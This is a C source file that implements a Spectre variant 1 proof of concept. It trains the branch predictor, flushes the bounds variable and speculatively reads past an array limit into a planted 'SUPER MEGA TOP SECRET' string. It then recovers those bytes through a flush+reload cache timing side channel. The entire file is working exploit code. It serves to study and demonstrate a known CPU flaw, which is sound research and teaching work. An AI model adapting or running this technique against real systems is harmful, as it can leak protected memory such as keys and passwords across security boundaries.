#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <emmintrin.h>

#define BORING_DATA "boring data |"
#define SECRET "SUPER MEGA TOP SECRET"
#define TOTAL_DATA BORING_DATA SECRET

struct page_{
  char data_[4096];
}typedef page_ ;

unsigned char array1[128];
page_ *array2;
const int pagesize = 4096;;
const int CACHE_MISS = 185;
size_t boring_data_length = sizeof(BORING_DATA) - 1;
page_ temp;

char target_function(int x)
{
  // We are allowed to access the array from 0 <-> boring_data_length
  // array1 <--BORING_DATA--><--SECRET-->
  if (((float) x / (float) boring_data_length < 1))
  {
    temp = array2[array1[x]];
  }
}

void init_array1()
{
  memcpy(array1, TOTAL_DATA, sizeof(TOTAL_DATA));
  array1[sizeof(array1) - 1] = '\0';
}

void init_array2()
{
  array2 = aligned_alloc(pagesize, sizeof(page_) * 256);
  for(int i = 0;i < 256;i++)
    memset(array2[i].data_,0,pagesize);
}

void spoofPHT()
{
  for (int y = 0; y < 20; y++)
    target_function(0);
}

uint64_t rdtsc()
{
  uint64_t a, d;
  _mm_mfence();
  asm volatile("rdtsc" : "=a"(a), "=d"(d));
  a = (d << 32) | a;
  _mm_mfence();
  return a;
}

int check_if_in_cache(void *ptr)
{
  uint64_t start = 0, end = 0;

  volatile int reg;

  start = rdtsc();
  reg = *(int*)ptr;
  end = rdtsc();

  if (end - start < CACHE_MISS)
    return 1;

  return 0;
}

void recover_data_from_cache(char *leaked, int index)
{
  for (int i = 0; i < 255; i++)
  {
    // Make the array_element value jump between two values
    // 144 - 16 - 143 - 15 - 142 - 14
    // This way the OS does not know what the next value we want is going to be
    // and it can not load it correctly into cache (255 / 2 ~= 127)
    int array_element = ((i * 127)) % 255;
    int value_in_cache = check_if_in_cache(&array2[array_element]);
    _mm_clflush(&array2[array_element]);
    if (value_in_cache)
    {
      if ((array_element >= 'A' && array_element <= 'Z'))
        leaked[index] = (char)array_element;
      sched_yield();
    }
  }
}

int main(int argc, const char **argv)
{
  init_array1();
  init_array2();

  char leaked[sizeof(TOTAL_DATA) + 1];
  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(TOTAL_DATA)] = '\0';

  while (1)
  {
    for (int i = 0; i < sizeof(TOTAL_DATA); i++)
    {
      // train the Pattern History Table
      spoofPHT();

      // Serializing event
      _mm_lfence();
      _mm_clflush(&boring_data_length);

      target_function(i);

      // Serializing event
      _mm_lfence();
      recover_data_from_cache(leaked, i);

    }
    for(int i = sizeof(BORING_DATA)-1;i < sizeof(leaked);i++)
      printf("%c", leaked[i]);
    printf("\n");
    if (!strncmp(leaked + sizeof(BORING_DATA) - 1, SECRET, sizeof(SECRET) - 1))
      break;
  }
  return (0);
}